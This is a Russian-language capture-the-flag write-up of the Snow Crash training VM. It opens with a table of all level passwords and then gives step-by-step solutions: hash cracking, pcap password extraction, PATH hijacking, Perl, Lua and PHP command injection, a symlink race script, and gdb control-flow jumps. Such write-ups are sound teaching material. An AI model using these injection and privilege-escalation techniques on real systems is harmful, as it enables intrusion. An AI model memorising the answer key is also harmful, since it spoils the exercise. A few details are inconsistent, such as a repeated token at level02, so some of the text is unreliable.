# Описание проекта.
Проект по поиску уязвимостей безопасности.  \
На платформе intra на странице проекта есть образ, который необходимо запустить на виртуальной машине и получить пароли от пользователей                               \
level00 level01 level02 level03 level04     \
level05 level06 level07 level08 level09     \
level10 level11 level12 level13 level14

Скрипт для запуска образа в VirtualBox: `Vbox/setup.sh`.

Полученные пароли записаны в файлы: levelXX/flag, \
где XX - номер уровня, на котором получен пароль.

Ниже последовательно описаны мои действия по достижению цели.

<a name="content"></a> 
# Содержание и список полученных паролей от пользователя level(xx+1)

| Пользователь level(xx) | пароль от level(xx+1)                     |  
| ---------------------- | -----------------------------------------:|
| [level00](#lvl00)      | x24ti5gi3x0ol2eh4esiuxias                 |
| [level01](#lvl01)      | f2av5il02puano7naaf6adaaf                 |
| [level02](#lvl02)      | kooda2puivaav1idi4f57q8iq                 |
| [level03](#lvl03)      | qi0maab88jeaj46qoumi7maus                 |
| [level04](#lvl04)      | ne2searoevaevoem4ov4ar8ap                 |
| [level05](#lvl05)      | viuaaale9huek52boumoomioc                 |
| [level06](#lvl06)      | wiok45aaoguiboiki2tuin6ub                 |
| [level07](#lvl07)      | fiumuikeil55xe9cu4dood66h                 |
| [level08](#lvl08)      | 25749xKZ8L7DkSCwJkT9dyv6f                 |
| [level09](#lvl09)      | s5cAJpM8ev6XHw998pRWG728z                 |
| [level10](#lvl10)      | feulo4b72j7edeahuete3no7c                 |
| [level11](#lvl11)      | fa6v5ateaw21peobuub8ipe6s                 |
| [level12](#lvl12)      | g1qKMiRpXf53AWhDaU7FEkczr                 |
| [level13](#lvl13)      | 2A31L79asukciNyi8uppkEuSx                 |
| [level14](#lvl14)      | 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ   |

  
#
###### [вернуться к содержанию](#content)
<a name="lvl00"></a>  
# level00


1. Проверяю содержимое директории:
```
ls -la
```
Ничего нет интересного. С помощью cat не обнаруживаю также информации в баш файлах

2. Ищу файлы, связанные с пользователем flag00
```sh
find / -user flag00 2>/dev/null
# ||
# \/
# /usr/sbin/john
# /rofs/usr/sbin/john

cat /usr/sbin/john
# ||
# \/
# cdiiddwpgswtgt

```
3. В файле что-то зашифровано. \
В названии файла john.         \
john восстановит пароль по хешу.
Хеш пароля начинается с числа (число+строка). \
Всё же проверила программой, и конечно же ничего не получила. \
Значит, надо другой способ.

В Видео по проекту (на intra) упоминались декодеры.
Нахожу в интернете и пытаюсь расшифровать файл. 

dcode.fr: \
Rechercher un outil ввести содержимое файла \
чуть ниже перейти по ссылке для поиска идентификатора Need to decrypt a message? Try our cipher identifier! https://www.dcode.fr/cipher-identifier

подойдет ROT Cipher https://www.dcode.fr/rot-cipher, можно цезаря
первый результат в списке - пароль
```sh
su flag00 nottoohardhere

getflag
# ||
# \/
# Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias

# перехожу к 01му уровню
su level01 x24ti5gi3x0ol2eh4esiuxias
```

#
###### [вернуться к содержанию](#content)
<a name="lvl01"></a> 
# level01

1. Проверяю содержимое директории:
```sh
ls -la
find / -user flag01 2>/dev/null
```
Ничего нет. Нет подсказок никаких. 

2. Тогда прямолинейно заглядываю в пароли ))))
```sh
cat /etc/passwd
# ||
# \/
# level13:x:2013:2013::/home/user/level13:/bin/bash
# level14:x:2014:2014::/home/user/level14:/bin/bash
# flag00:x:3000:3000::/home/flag/flag00:/bin/bash
# flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
пользователь:пароль(х или другой символ, /etc/shadow расшифрованные пароли):id пользователя uid: gid id группы: домашняя директория: дефолтный shell

Нахожу захешированный пароль flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
3. Создаю файл с этой строкой и передаю в john (подсказка в названии файла с level00)
```sh
#------#
# MacOS
# https://download.openwall.net/pub/projects/john/contrib/macosx/
# ||
# \/
# john-1.8.0.9-jumbo-macosx_avx2.zip

# ./john ~/Desktop/snow_crash/lvl01ForJohn
# cat john.pot
# ||
# \/
# 42hDRfypTqqnw:abcdefg

# либо 
# ./john ~/Desktop/snow_crash/lvl01ForJohn --show
# ||
# \/
# flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

# можно этим скриптом:
#!/bin/bash

#!/bin/bash

curl -O https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_avx2.zip
chmod 777 ./john-1.8.0.9-jumbo-macosx_avx2.zip
unzip john-1.8.0.9-jumbo-macosx_avx2.zip
rm -rf ./john-1.8.0.9-jumbo-macosx_avx2.zip
cd  ~/Desktop/Snow_Crash/Vbox/john-1.8.0.9-jumbo-macosx_avx2/run

./john                                          \
        ~/Desktop/Snow_Crash/lvl01ForJohn       \
        # --format=descrypt-opencl                \
        # --wordlist=/usr/share/john/password.lst \
        # --show                                  \
echo
cat ~/Desktop/Snow_Crash/Vbox/john-1.8.0.9-jumbo-macosx_avx2/run/john.pot

echo
cd  ~/Desktop/Snow_Crash/Vbox
rm -rf john-1.8.0.9-jumbo-macosx_avx2
```

```sh
#------#
# Ubuntu
sudo snap install john-the-ripper

john ~/Desktop/github/Snow_crash/lvl01ForJohn --show
# ||
# \/
# Created directory: /home/user/snap/john-the-ripper/555/.john
# Created directory: /home/user/snap/john-the-ripper/555/.john/opencl
# flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
# 1 password hash cracked, 0 left

```
flag01:**abcdefg**:3001:3001::/home/flag/flag01:/bin/bash \
abcdefg искомый пароль
```sh
su flag01
# ||
# \/
# Password: abcdefg
# Don't forget to launch getflag !

getflag
# ||
# \/
# Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```

```
su level02 f2av5il02puano7naaf6adaaf
```

#
###### [вернуться к содержанию](#content)
<a name="lvl02"></a> 
# level02

1. Проверяю содержимое директории:
```sh
ls -la
cat level02.pcap 
```
.pcap => TCP пакет \
https://open-file.ru/types/pcap \
Файл PCAP содержит данные сетевых пакетов, \
перехваченных программой-анализатором трафика Wireshark


Password: Nf&NatB'̊$E4��@@J-;���;��ߙO/Y�, login incorrect - возможно, это нужный пароль. \
Осталось расшифровать.

2. Расшифровать пакет: \
https://www.tcpdump.org/manpages/tcpdump.1.html

```sh
tcpdump -r ~/level02.pcap -Xq | nl
# ||
# \/
#  230  06:23:26.095219 IP 59.233.235.223.12121 > 59.233.235.218.39247: tcp 13
#  231          0x0000:  4500 0041 d4b3 4000 4006 1677 3be9 ebdf  E..A..@.@..w;...
#  232          0x0010:  3be9 ebda 2f59 994f baa8 fb18 9d18 157b  ;.../Y.O.......{
#  233          0x0020:  8018 01c5 279d 0000 0101 080a 02c2 3c62  ....'.........<b
#  234          0x0030:  011b b987 000d 0a50 6173 7377 6f72 643a  .......Password:
#  235          0x0040:  20    
```
 tcpdump -r не покажет тело пакета - только заголовки \
 -xq покажет тело пакета \
 -X  попытается как ascii расшифровать тело пакета \
 -n  ip не конвертировать в доменное имя 

о tcp пакетах \
https://networkguru.ru/protokol-transportnogo-urovnia-tcp-chto-nuzhno-znat/ \
`||` \
`\/` \
пакеты с флагами PSH не буферизуются, а сразу в приложение идут. Нам нужны именно они. \
 см. по ссылке картинку Заголовок TCP. В ней отсчитываю: \
 source port - 0 и 1 байт, \
 destination port - 2 и 3 , \
 sequence number 4-7 и т.д. => получаю флаги под номером 13. \
 среди них умножаю этот байт на 8 (00001000 - здесь пуш под номером 5, то есть 8) 

tcp[13] & 8 != 0 проверяет, установлен ли этот флаг в 0 или 1

![tcp[13] & 8 != 0](tcp.jpg)

and src 59.233.235.218 фильтрую пакеты по отправителю (отправитель вводит пароль)
```sh
tcpdump -r ~/level02.pcap -n -Xq | nl | grep assword
# ||
# \/
# reading from file /home/user/level02/level02.pcap, link-type EN10MB (Ethernet)
#  234          0x0030:  011b b987 000d 0a50 6173 7377 6f72 643a  .......Password:
```
по списку вижу первый непустой пакет - 06:23:34 после запроса пароля
```sh
# фильтрую командами:
# grep -A 10000 "06:23:34" |\
#     grep "0x0030" |\
tcpdump -r ~/level02.pcap -n -xq -tttt \
    'tcp[13] & 8 != 0 and src 59.233.235.218' 2>/dev/null |\
    grep -A 10000 "06:23:34" |\
    grep "0x0030" |\
```
все строки ниже этого времени и содержащие 0x0030 (там тело TCP пакета)
10000 количество отображаемых строк

```sh
# cut -d' ' -f5 после пробела взять 5й столбец
tcpdump -r ~/level02.pcap -n -xq -tttt                      \
    'tcp[13] & 8 != 0 and src 59.233.235.218' 2>/dev/null | \
    grep -A 10000 "06:23:34" |                              \
    grep "0x0030" |                                         \
    cut -d' ' -f5 
```
получаю символ в 16ричной системе   \
перевожу в ascii.                   \
Для этого можно либо онлайн, либо свой декодер использовать (онлайн может не удалять символы при 7f встрече)                      \
https://www.dcode.fr/ascii-code      \
 получаю:
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c 0d \
HEX /2: ft_wandrNDRelL0L

получаю  ft_waNDReL0L

su flag02 с этим паролем ft_waNDReL0L
```sh
getflag
# ||
# \/
# Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
# перехожу к 3му уровню
su level03 kooda2puivaav1idi4f57q8iq
```

#
###### [вернуться к содержанию](#content)
<a name="lvl03"></a> 
# level03
1. Проверяю содержимое директории:
```sh
ls -la
# ||
# \/
# -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
x - можно запустить
флаг прав s -запустить с правами создателя

ltrace выведет все библиотечные функции, которые используются
```sh
ltrace ./level03
```
2. Уязвимость:

system("/usr/bin/env echo Exploit me")

создаю свой echo, меняю PATH на путь к себе в начале, запускаю level03:
```sh
ls -la / 
# нахожу место допустимое для записи 
# ||
# \/
# d-wx-wx-wx   4 root root   80 Feb  6 13:14 tmp 
```

создаю своё echo
```
touch /tmp/echo
chmod 777 /tmp/echo
```

```sh
#!/bin/bash
# my echo:

getflag
```
меняю начало переменной PATH на путь к нужной мне папке - с моим скриптом echo:
```sh
export PATH=/tmp:$PATH
```
запускаю снова:
```sh
./level03
# ||
# \/
# Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

# перехожу к 4му уровню
su level04 qi0maab88jeaj46qoumi7maus
```

#
###### [вернуться к содержанию](#content)
<a name="lvl04"></a> 
# level04
1. Проверяю содержимое директории:
```sh
ls -la
cat level04.pl
```

```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
Пояснения: \
обратиться к первому переданному аргументу и его значение присвоить переменной y \
$y = $_[0];

здесь  print \`echo $y 2>&1\`;     \
\` работают аналогично system

`x(param("x"));`
в квери параметре если указать `index.py?x=$(getflag)`, подставится нужная команда вместо x
```sh
curl localhost:4747?x='$(getflag)'
# ||
# \/
# Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

# перехожу к 5му уровню
su level05 ne2searoevaevoem4ov4ar8ap
```

#
###### [вернуться к содержанию](#content)
<a name="lvl05"></a> 
# level05

1. В терминале при переходе на уровень появляется сообщение, что пришло письмо (иногда не появляется). \
В переменной окружения MAIL путь к письму
```sh
cat /var/mail/level05 
# ||
# \/
# */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
*/2 * * * * синтаксис линукс планировщика. Для расшифровки:
https://crontab.guru/ \
`||` \
`\/` \
“At every 2nd minute.”
значит запускается скрипт с правами flag05
```sh
cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
значит, надо положить в /opt/openarenaserver/ свой скрипт \
getfacl /opt/openarenaserver/ - покажет наличие возможности записывать в эту папку
```sh
#!/bin/bash
echo "getflag > /opt/openarenaserver/psswflag" > /opt/openarenaserver/run.sh

cat /opt/openarenaserver/psswflag
# ||
# \/
# Check flag.Here is your token : viuaaale9huek52boumoomioc

su level06 viuaaale9huek52boumoomioc
```

#
###### [вернуться к содержанию](#content)
<a name="lvl06"></a> 
# level06

1. Проверяю содержимое директории:
```sh
ls -la
./level06
# ||
# \/
# PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

cat level06.php
# ||
# \/
```
```php
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}
function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```
"Модификатор e является устаревшим модификатором регулярного выражения , который позволяет вам использовать код PHP в вашем регулярном выражении. Это означает, что все, что вы анализируете, будет оцениваться как часть вашей программы. "\
https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
```pl
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 

вызывается функция "y(\"\\2\")", и применяется к строке а
\2 - вторая скобочная группа в регулярных выражениях

(\[x (.*)\]) - первая скобочная группа
     (.*)    - вторая скобочная группа
```

https://regexr.com/ \
визуализирует регулярное выражение \
[x fsdg] подсветит, то есть что-то, что начинается "[x ", далее "." - это 1 любой символ, "*" - сколько угодно символов, далее "]". Значит, что будет вызвана функция у с fsdg.
```pl
$r = x($argv[1], $argv[2]); х вызывается с агрументами
function x($y, $z) { 
    $a = file_get_contents($y); 
file_get_contents - читает содержимое файла
```
Создаю файл и передаю его в аргументы с содержимым: \
2 варианта: 
```pl
[x ${`getflag`}]
[x {${system(getflag)}}]
```
Подробнее про такой синтаксис `{${}}` \
echo "This is the value of the var named by the return value of getName(): {${getName()}}" \
https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple

в php \` \` отработает как функция system
```sh
echo '[x {${system(getflag)}}]' > /tmp/myy
```
где ${} позволят вставить значение `exec(getflag)`, то есть `exec(getflag)` не текст будет, а вызовется функция. Это нужно, потому что здесь  двойные кавычки `y(\"\\2\")`.

Запускаю программу:
```sh
./level06 /tmp/myy gdfgdfgh
# ||
# \/
# PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
# Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
# PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

su level07 wiok45aaoguiboiki2tuin6ub
```

#
###### [вернуться к содержанию](#content)
<a name="lvl07"></a> 
# level07

1. Проверяю содержимое директории:
```sh
ls -la
# ||
# \/
# -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

ltrace ./level07 
# ||
# \/
```
```sh
__libc_start_main(0x8048514, 1, 0xbffff6f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                 = 2007
geteuid()                                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
getenv("LOGNAME")                                                         = "level07"
asprintf(0xbffff644, 0x8048688, 0xbfffff27, 0xb7e5ee55, 0xb7fed280)       = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```
getenv("LOGNAME") = "level07" \
Значит:
```sh
export LOGNAME='$(getflag)'
./level07 
# ||
# \/
# Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

su level08 fiumuikeil55xe9cu4dood66h
```

#
###### [вернуться к содержанию](#content)
<a name="lvl08"></a> 
# level08

Проверяю содержимое директории:
```sh
ls -la
# ||
# \/
# -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
# -rw-------  1 flag08  flag08    26 Mar  5  2016 token

./level08 
# ||
# \/
# ./level08 [file to read]

./level08 token 
# ||
# \/
# You may not access 'token'

```
1 . простой путь
```sh
ls -la
# ||
# \/
# drwxrwxrwx+ 1 level08 level08  160 Feb  8 11:50 .

chmod 777 .

ln -s token tkn

./level08 tkn
# ||
# \/
# quif5eloekouj29ke0vouxean
su flag08 quif5eloekouj29ke0vouxean

getflag
# ||
# \/
# Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

su level09 25749xKZ8L7DkSCwJkT9dyv6f
```


2. Длинный, рабочий, веселый путь )))) 

Теперь надо найти папку, куда записать токен с новым именем
```sh
ls -lA -R / 2>/dev/null | grep -E 'd[rwxst-]{6}rw.'
# ||
# \/
# drwxrwxrwx 21 root root  364 Mar 12  2016 rofs
# drwxrwxrwt  2 root root    3 Mar 12  2016 tmp
# drwxrwsrwt  2 root whoopsie   3 Mar 12  2016 crash
# drwxrwxrwt 4 root       root         80 Feb  8 10:53 lock
# drwxrwxrwt 2 root       root         40 Feb  8 10:53 shm
# drwxrwsrwt 2 root whoopsie   3 Mar 12  2016 crash

find / -name tmp -type d 2>/dev/null
# ||
# \/
# /tmp
# /var/tmp
# /rofs/tmp
# /rofs/var/tmp
```
ls -la на каждую папку - ни одна не подходит. \
Далее по порядку crash
```sh
find / -name crash -type d 2>/dev/null
# ||
# \/
# /usr/src/linux-headers-3.2.0-89-generic-pae/include/config/crash
# /var/crash
# /rofs/usr/src/linux-headers-3.2.0-89-generic-pae/include/config/crash
# /rofs/var/crash

ls -lad /var/crash
# ||
# \/
# drwxrwsrwt 2 root whoopsie 3 Mar 12  2016 /var/crash
# есть!

# или
find / -name shm -type d 2>/dev/null
# ||
# \/
# /run/shm
# есть!

ln -s token /var/crash/tkn
# или
ln -s token /run/shm/tkn

./level08 /run/shm/tkn
```

#
###### [вернуться к содержанию](#content)
<a name="lvl09"></a> 
# level09

1. Проверяю содержимое директории:
```sh
ls -la
# ||
# \/
# -rwsr-sr-x 1 flag09  level09 7640 Mar  5  2016 level09
# ----r--r-- 1 flag09  level09   26 Mar  5  2016 token

./level09 token 
# ||
# \/
# tpmhr

./level09 00000000000000 
# ||
# \/
# 0123456789:;<=

```
Предполагаю: \
token hfcibahjdsdf. 0 -1 -2 и так далее

Пишу myscript.py
```py
import sys

f = open('token','r')
tokenstr=f.read()
for i in range(len(tokenstr) - 1):
    sys.stdout.write(chr(ord(tokenstr[i])-i))
print
```
или можно повеселиться и цикл записать одной строкой
```py
f = open('token','r')
tokenstr=f.read()
print("".join([chr(ord(tokenstr[i])-i) for i in range(len(tokenstr) - 1)]))
```

запускаю скрипт:
```sh
python myscript.py 
# ||
# \/
# f3iji1ju5yuevaus41q1afiuq

su flag09
# ||
# \/
# Password: f3iji1ju5yuevaus41q1afiuq
# Don't forget to launch getflag !

getflag
# ||
# \/
# Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z

su level10 s5cAJpM8ev6XHw998pRWG728z
```

#
###### [вернуться к содержанию](#content)
<a name="lvl10"></a> 
# level10

1. Смотрю, что есть:
```sh
ls -la
# ||
# \/
# -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10 \
# -rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
2. Запускаю и пытаюсь понять, что можно сделать с этой программкой
```sh
./level10
# ||
# \/
# ./level10 file host

./level10 file host
# ||
# \/
# sends file to host if you have access to it

./level10 token 127.0.0.1
# ||
# \/
# You don't have access to token

./level10 level10 127.0.0.1
# ||
# \/
# Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1

./level10 level10 drfhgdfghxfg
# ||
# \/
# Connecting to drfhgdfghxfg:6969 .. Unable to connect to host drfhgdfghxfg
```
3. Программа отправляет файл на сервер, использующий порт 6969. \
Значит, надо запустить сервер на этом порту, который будет получать файл и писать его куда-то. \
Создаю файл, в который сервер будет записывать полученный файл 
```sh
touch tkn
chmod 777 tkn
```
На выбор:
* Запускаю сервер и во втором терминале буду отправлять файл
```
nc -l 6969 
```

* Либо сервер в фоне 
```
nc -l -k 6969 > tkn &
```

4. Поиск уязвимостей. \
Следующая команда показывает использование access и open, что создает уязвимость: \
http://www.opennet.ru/cgi-bin/opennet/man.cgi?category=2&topic=access
```
ltrace ./level10 2.txt 127.0.0.1
```
Пишу скрипт (создать ссылку то на один файл, то на другой - и всё это в бесконечном цикле) и запускаю 
```sh
./myscript.sh &
```

```sh
#!/bin/bash
# myscript.sh
touch in
chmod 777 in
while 1 
do
 ln -sf in mylink
 ln -sf token mylink
done
```
5. Запускаю программу много раз подряд и периодически проверяю, записалось ли содержимое файла token сервером в tkn:
```sh
./level10 mylink 127.0.0.1
```

```sh
cat tkn
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
```

```sh
su flag10
# ||
# \/
# Password: woupa2yuojeeaaed06riuj63c
# Don't forget to launch getflag !

getflag
# ||
# \/
# Check flag.Here is your token : feulo4b72j7edeahuete3no7c

su level11
Password: feulo4b72j7edeahuete3no7c
```

#
###### [вернуться к содержанию](#content)
<a name="lvl11"></a> 
# level11

1. Смотрю, что есть
```sh
ls -la
# ||
# \/
# -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

cat level11.lua 
# ||
# \/
```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

```

2. Уязвимость аналогично предыдущим заданиям: 
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```
lua: `..` - это аналог `+` :"echo всё_введённое | sha1sum"

отправляю в сервер запрос: 
```sh
telnet 127.0.0.1 5151
$(getflag) > /home/user/level11/tkn
```

И в tkn конечно же ничего не записалось ))))

3. Найти способ записать в tkn
```sh
getfacl .
```
Показывает, что именно пользователь user:flag11:r-x \
меняю флаги:
```sh
setfacl -m u:flag11:rwx .
```
4. Повторяю 2.
```sh
telnet 127.0.0.1 5151
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Password:  $(getflag) > /home/user/level11/tkn
Erf nope..
Connection closed by foreign host.

cat tkn
# ||
# \/
# Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

su level12 fa6v5ateaw21peobuub8ipe6s
```

#
###### [вернуться к содержанию](#content)
<a name="lvl12"></a> 
# level12

1. Смотрю:
```sh
ls -la
# ||
# \/
# -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl

cat level12.pl 
# ||
# \/
```
```pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; # y
  $xx = $_[0]; # x
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

$xx =~ tr/a-z/A-Z/;  \
перевести в верхний регистр

общие регулярки \
s/\s.*// \
\s («s»: от английского «space» – «пробел»)

https://www.opennet.ru/docs/RUS/perl_regex/ \
perl регулярки \
s/.../.../ - подстановка текста (substitution),

подставить / вместо пробела и одного символа в любом количестве (напр " рррррр") / подставить ничего (удалить)

2. Обращаю внимание на строку 
```pl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
она заключена в \` \`

3. Подставляю квери параметры такие, чтобы получить в этой строке getflag \
curl 127.0.0.1:4646?x= \
$xx =~ tr/a-z/A-Z/;  переведет в верхний регистр, значит мне надо запустить скрипт, который запустит getflag
```sh
touch MYSCRIPT.SH
# ||
# \/
```
```sh
#!/bin/bash

getflag > /tmp/tkn
```

```sh
getfacl .
# ||
# \/
# default:user:flag12:r-x
# default:group:flag12:r-x

chmod 777 .
setfacl -m u:flag12:rwx,group:flag12:rwx .

curl 127.0.0.1:4646?x='$(/home/user/level12/MYSCRIPT.SH)'
```
не сработает ))
потому что путь будет переведен в верхний регистр

4. wildcard * поможет. \
На большое количество звезд можно получить ошибку
```sh
ls -l /*/*/*/*/*/*/*/
# ||
# \/
# bash: /usr/bin/ls: Слишком длинный список аргументов
```
Закидываю скрипт в tmp и
```sh
curl 127.0.0.1:4646?x='$(/*/MYSCRIPT.SH)'
cat /tmp/tkn2
# ||
# \/
# Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
можно еще так: 
```sh
curl 127.0.0.1:4646?x='$(/???/MYSCRIPT.SH)'

cat /tmp/tkn2
# ||
# \/
# Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

```sh
su level13
Password: g1qKMiRpXf53AWhDaU7FEkczr
```

#
###### [вернуться к содержанию](#content)
<a name="lvl13"></a> 
# level13

1. Проверяю директорию и ее содержимое
```sh
ls -la
# ||
# \/
# -rwsr-sr-x 1 flag13  level13 7303 Aug 30  2015 level13

./level13 
# ||
# \/
# UID 2013 started us but we we expect 4242
```

2. Пробую дизассемблировать: 
```sh
gdb ./level13
```
```sh
disas (пробел и таб)
# получаю список функций программы. Начинаю с main
(gdb) disas  main
# Dump of assembler code for function main:
#    0x0804858c <+0>:     push   %ebp
#    0x0804858d <+1>:     mov    %esp,%ebp
#    0x0804858f <+3>:     and    $0xfffffff0,%esp
#    0x08048592 <+6>:     sub    $0x10,%esp
#    0x08048595 <+9>:     call   0x8048380 <getuid@plt>
#    0x0804859a <+14>:    cmp    $0x1092,%eax
#    0x0804859f <+19>:    je     0x80485cb <main+63>
#    0x080485a1 <+21>:    call   0x8048380 <getuid@plt>
#    0x080485a6 <+26>:    mov    $0x80486c8,%edx
#    0x080485ab <+31>:    movl   $0x1092,0x8(%esp)
#    0x080485b3 <+39>:    mov    %eax,0x4(%esp)
#    0x080485b7 <+43>:    mov    %edx,(%esp)
#    0x080485ba <+46>:    call   0x8048360 <printf@plt>
#    0x080485bf <+51>:    movl   $0x1,(%esp)
#    0x080485c6 <+58>:    call   0x80483a0 <exit@plt>
#    0x080485cb <+63>:    movl   $0x80486ef,(%esp)
#    0x080485d2 <+70>:    call   0x8048474 <ft_des>
#    0x080485d7 <+75>:    mov    $0x8048709,%edx
#    0x080485dc <+80>:    mov    %eax,0x4(%esp)
#    0x080485e0 <+84>:    mov    %edx,(%esp)
#    0x080485e3 <+87>:    call   0x8048360 <printf@plt>
#    0x080485e8 <+92>:    leave  
#    0x080485e9 <+93>:    ret    
```
   0x08048595 <+9>:     call   0x8048380 <getuid@plt> \
   значение id сохраняется в %eax                     \
   0x0804859a <+14>:    cmp    $0x1092,%eax - числовая константа в 16м формате (4242 в 10м) \
   условный прыжок после сравнения:                   \
   0x0804859f <+19>:    je     0x80485cb <main+63>    \
`||`                                                  \
`\/`                                                  \
  0x080485cb <+63>:    movl   $0x80486ef,(%esp)

```sh
# break point устанавливаю 
b *0x0804859a
# ||
# \/
# Breakpoint 1 at 0x804859a

# запускаю прогу
run 

# прыгаю, куда надо
jump *0x080485cb
# ||
# \/
# Continuing at 0x80485cb.
# your token is 2A31L79asukciNyi8uppkEuSx
# [Inferior 1 (process 27200) exited with code 050]
```
```sh
su level14
Password: 2A31L79asukciNyi8uppkEuSx
```

\
\
2 способ

  0x0804859a <+14>:    cmp    $0x1092,%eax \
Попробую перезаписать uid
```sh
p $eax=4242
# ||
# \/
# $1 = 4242

# p - print, посмотрю, как записалось
(gdb) p $eax
# ||
# \/
# $2 = 4242

# проверю регистры 
info register
# ||
# \/
# eax            0x1092   4242
# ecx            0xbffff6d4       -1073744172
# edx            0xbffff664       -1073744284
# ebx            0xb7fd0ff4       -1208152076
# esp            0xbffff620       0xbffff620
# ebp            0xbffff638       0xbffff638
# esi            0x0      0
# edi            0x0      0
# eip            0x804859a        0x804859a <main+14>
# eflags         0x200246 [ PF ZF IF ID ]
# cs             0x73     115
# ss             0x7b     123
# ds             0x7b     123
# es             0x7b     123
# fs             0x0      0
# gs             0x33     51

(gdb) run 

# Продолжаем с точки остановки:
c
# ||
# \/
# Continuing.
# your token is 2A31L79asukciNyi8uppkEuSx
# [Inferior 1 (process 13292) exited with code 050]
# (gdb) 


su level14 2A31L79asukciNyi8uppkEuSx
```

#
###### [вернуться к содержанию](#content)
<a name="lvl14"></a> 
# level14

1. Проверяю содержимое директории:
```sh
ls -la
find / -user flag14 2>/dev/null
cat /etc/passwd
```
Ничего не дало

2. ломаю getflag

```sh
gdb getflag
```
disas  main очень длинный.                    \
Сохраняю в файл lvl14.asm вывод и работаю с файлом.
```sh
id flag14
# ||
# \/
# uid=3014(flag14) gid=3014(flag14) groups=3014(flag14),1001(flag)
```
Перевожу из 10ной системы счисления в 16ную:  \
3014 10->16:                                  \
BC6
```sh
cat lvl14.asm | grep bc6
# ||
# \/
#  0x08048b46 <+512>:   je     0x8048bc6 <main+640>
#  0x08048bb6 <+624>:   cmp    $0xbc6,%eax
#  0x08048bc6 <+640>:   mov    0x804b060,%eax
```
Далее смотрю содержимое после строки с cmp:       \
0x08048bb6 <+624>:   cmp    $0xbc6,%eax           \
0x08048bbb <+629>:   je     0x8048de5 <main+1183> \
`||`                                              \
`\/`                                              \
Необходимо прыгнуть на main+1183.

